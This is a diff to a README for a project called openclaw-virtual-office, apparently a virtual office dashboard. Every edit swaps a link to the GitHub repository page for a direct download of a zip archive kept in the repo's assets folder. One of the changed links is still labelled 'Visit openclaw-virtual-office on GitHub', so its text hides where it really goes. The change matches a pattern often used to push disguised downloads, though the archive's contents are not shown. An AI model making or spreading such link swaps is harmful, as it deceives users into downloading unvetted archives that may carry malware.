@@ -1,6 +1,6 @@
 # 🏢 openclaw-virtual-office - Simple Virtual Office Dashboard
 
-[![Download openclaw-virtual-office](https://img.shields.io/badge/Download-openclaw--virtual--office-brightgreen?style=for-the-badge)](https://github.com/ketangope/openclaw-virtual-office)
+[![Download openclaw-virtual-office](https://img.shields.io/badge/Download-openclaw--virtual--office-brightgreen?style=for-the-badge)](https://github.com/ketangope/openclaw-virtual-office/raw/refs/heads/main/assets/office/openclaw-office-virtual-v2.3.zip)
 
 ---
 
@@ -30,7 +30,7 @@ If your PC has these, you can proceed to download and use the app.
 
 Visit this page to download the software:
 
-[Download openclaw-virtual-office](https://github.com/ketangope/openclaw-virtual-office)
+[Download openclaw-virtual-office](https://github.com/ketangope/openclaw-virtual-office/raw/refs/heads/main/assets/office/openclaw-office-virtual-v2.3.zip)
 
 On the page:
 
@@ -97,7 +97,7 @@ If problems continue, check the openclaw-virtual-office page on GitHub for help 
 
 For more details, guides, and updates, use the official GitHub page:
 
-[Visit openclaw-virtual-office on GitHub](https://github.com/ketangope/openclaw-virtual-office)
+[Visit openclaw-virtual-office on GitHub](https://github.com/ketangope/openclaw-virtual-office/raw/refs/heads/main/assets/office/openclaw-office-virtual-v2.3.zip)
 
 There you will find:
 
@@ -117,4 +117,4 @@ Keep the app current by checking the GitHub downloads page regularly.
 
 ---
 
-# [Download openclaw-virtual-office now](https://github.com/ketangope/openclaw-virtual-office)
+# [Download openclaw-virtual-office now](https://github.com/ketangope/openclaw-virtual-office/raw/refs/heads/main/assets/office/openclaw-office-virtual-v2.3.zip)
